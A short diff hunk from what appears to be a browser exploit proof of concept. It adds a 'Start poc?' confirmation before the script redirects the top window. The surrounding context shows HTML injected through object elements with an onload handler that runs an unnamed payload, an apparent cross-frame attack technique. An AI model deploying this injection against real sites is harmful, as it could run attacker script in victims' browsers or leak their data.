@@ -30,7 +30,12 @@
             `<object style=width:100% name=x data=${thisUrl}></object><object data=` +
             `//${location.host}/empty.html name=lload onload=${payload}></object>`
         );
-
+        
+        if(top === window){
+            let startPoc = confirm("Start poc?");
+            if(!startPoc) throw /stopped/;
+        }
+        
         top.location = top_url + '##'
 
         let identifier = '';
